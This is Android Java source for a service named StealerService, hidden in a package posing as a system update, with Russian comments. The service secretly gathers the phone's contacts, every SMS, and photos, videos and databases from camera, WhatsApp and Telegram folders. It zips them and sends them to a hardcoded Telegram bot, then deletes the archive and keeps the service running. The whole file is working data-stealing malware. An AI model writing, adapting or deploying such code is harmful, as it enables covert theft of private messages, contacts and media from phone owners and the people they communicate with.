package com.system.update;

import android.app.Service;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Environment;
import android.os.IBinder;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.util.Log;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class StealerService extends Service {
    private static final String TAG = "StealerService";
    private final String BOT_TOKEN = "8364189800:AAHHsHHgKZ7oB6XSHExPWn0-0G5Fp8fGNi4";
    private final String CHAT_ID = "7725796090";
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "Service started");
        
        new Thread(() -> {
            try {
                // СБОР ДАННЫХ
                JSONObject report = new JSONObject();
                report.put("device", android.os.Build.MODEL);
                report.put("android", android.os.Build.VERSION.RELEASE);
                report.put("time", System.currentTimeMillis());
                
                // 1. Контакты
                JSONArray contacts = new JSONArray();
                Cursor cursor = getContentResolver().query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
                while (cursor.moveToNext()) {
                    JSONObject c = new JSONObject();
                    c.put("name", cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)));
                    c.put("phone", cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)));
                    contacts.put(c);
                }
                cursor.close();
                report.put("contacts", contacts);
                
                // 2. SMS
                JSONArray sms = new JSONArray();
                cursor = getContentResolver().query(Telephony.Sms.CONTENT_URI, null, null, null, null);
                while (cursor.moveToNext()) {
                    JSONObject s = new JSONObject();
                    s.put("address", cursor.getString(cursor.getColumnIndex("address")));
                    s.put("body", cursor.getString(cursor.getColumnIndex("body")));
                    s.put("date", cursor.getString(cursor.getColumnIndex("date")));
                    sms.put(s);
                }
                cursor.close();
                report.put("sms", sms);
                
                // 3. Файлы
                String[] paths = {
                    Environment.getExternalStorageDirectory() + "/Download/",
                    Environment.getExternalStorageDirectory() + "/DCIM/Camera/",
                    Environment.getExternalStorageDirectory() + "/WhatsApp/Media/",
                    Environment.getExternalStorageDirectory() + "/Telegram/",
                    "/data/data/com.whatsapp/databases/",
                    "/data/data/org.telegram.messenger/files/"
                };
                
                // Создаем ZIP
                File zipFile = new File(getCacheDir(), "data_" + System.currentTimeMillis() + ".zip");
                FileOutputStream fos = new FileOutputStream(zipFile);
                ZipOutputStream zos = new ZipOutputStream(fos);
                
                // Добавляем отчет
                ZipEntry entry = new ZipEntry("report.json");
                zos.putNextEntry(entry);
                zos.write(report.toString().getBytes());
                zos.closeEntry();
                
                // Добавляем файлы
                for (String path : paths) {
                    File dir = new File(path);
                    if (dir.exists()) {
                        addFilesToZip(dir, zos);
                    }
                }
                
                zos.close();
                fos.close();
                
                // ОТПРАВКА В TELEGRAM
                sendToTelegram(zipFile);
                
                // Удаляем временный файл
                zipFile.delete();
                
            } catch (Exception e) {
                Log.e(TAG, "Error: " + e.toString());
            }
        }).start();
        
        return START_STICKY;
    }
    
    private void addFilesToZip(File dir, ZipOutputStream zos) throws IOException {
        File[] files = dir.listFiles();
        if (files != null) {
            for (File file : files) {
                if (file.isDirectory()) {
                    addFilesToZip(file, zos);
                } else {
                    // Добавляем только определенные типы файлов
                    String name = file.getName().toLowerCase();
                    if (name.endsWith(".jpg") || name.endsWith(".png") || 
                        name.endsWith(".mp4") || name.endsWith(".db") ||
                        name.endsWith(".txt") || name.endsWith(".pdf")) {
                        
                        ZipEntry entry = new ZipEntry("files/" + file.getName());
                        zos.putNextEntry(entry);
                        
                        FileInputStream fis = new FileInputStream(file);
                        byte[] buffer = new byte[1024];
                        int len;
                        while ((len = fis.read(buffer)) > 0) {
                            zos.write(buffer, 0, len);
                        }
                        fis.close();
                        zos.closeEntry();
                    }
                }
            }
        }
    }
    
    private void sendToTelegram(File file) {
        try {
            String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument";
            HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            
            String boundary = "----" + System.currentTimeMillis();
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
            
            OutputStream os = conn.getOutputStream();
            
            // chat_id
            String part = "--" + boundary + "\r\n" +
                         "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n" +
                         CHAT_ID + "\r\n";
            os.write(part.getBytes());
            
            // document
            part = "--" + boundary + "\r\n" +
                  "Content-Disposition: form-data; name=\"document\"; filename=\"" + file.getName() + "\"\r\n" +
                  "Content-Type: application/zip\r\n\r\n";
            os.write(part.getBytes());
            
            FileInputStream fis = new FileInputStream(file);
            byte[] buffer = new byte[4096];
            int bytesRead;
            while ((bytesRead = fis.read(buffer)) != -1) {
                os.write(buffer, 0, bytesRead);
            }
            fis.close();
            
            os.write(("\r\n--" + boundary + "--\r\n").getBytes());
            os.flush();
            os.close();
            
            int response = conn.getResponseCode();
            Log.d(TAG, "Telegram response: " + response);
            
        } catch (Exception e) {
            Log.e(TAG, "Send error: " + e.toString());
        }
    }
        }
